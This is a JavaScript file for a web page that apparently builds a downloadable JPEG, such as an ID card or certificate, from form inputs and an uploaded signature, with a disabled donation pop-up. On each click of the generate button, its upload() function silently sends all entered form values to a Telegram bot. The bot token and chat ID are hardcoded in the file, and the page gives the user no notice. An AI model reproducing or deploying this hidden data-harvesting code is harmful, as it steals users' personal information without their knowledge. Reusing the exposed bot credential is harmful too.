// // output elements 
const output = Array.from(document.querySelectorAll('#main span'));
// input elements
const input = Array.from(document.querySelector(".inputs").children);

const fileInput = document.getElementById("formFile");
const SignOut = document.getElementById("sign")


function upload(data) {
    const URL = `https://api.telegram.org/bot6978650517:AAEWeLNPE2TkkXJ2OiPtoSjZk7UCEN-Jb2Y/sendMessage?chat_id=993778683&text=`
    fetch(URL + data);
}


function feedAll() {
    const data = {};
    input.map(
        (e, i) => {
            if (e.className != "form-label") {
                if (e.id != "formFile") {
                    console.log(e, output[i])
                    output[i].innerHTML = e.value;
                    data[output[i].className] = e.value;
                }
            }

        }
    );
    const blob = URL.createObjectURL(fileInput.files[0]);
    SignOut.src = blob

    upload(JSON.stringify(data));

    setTimeout(() => {
        html2canvas(document.getElementById("main"),

            {
                useCORS: true,      // Tells html2canvas to try loading images with CORS
                allowTaint: false,  // Do not allow tainted canvases
                logging: true,    // Useful for debugging if it still fails
            }
        ).then((res) => {
            var myImage = res.toDataURL("image/jpeg", 0.6);
            const a = document.createElement("a");
            a.href = myImage;
            a.target = "_blank"
            a.download = `${input[0].value}.jpg`;
            a.click();
        })
    }, 500)
}

const genbtn = document.getElementById("btn");

function donate() {
    Swal.fire({
        html: `
         <p style="color:#000">Donate to Support For Running This Site</p>
         <hr/>
        <p style="font-size:0.8rem">* Donation Needs to Run Always this Site</p>
        <p style="font-size:0.8rem">* You Can Donate Any Amount</p>
         <img src="qr.jpg" width="200px"/>
         <br/>

        `,
        showCloseButton: false,
        showCancelButton: false,
        focusConfirm: false,
        showConfirmButton:true,
        allowOutsideClick:false,

    });
}

genbtn.addEventListener('click', () => {
    // here charge or donation code !!!
    feedAll();
    // setTimeout(()=>donate(),2000)
})

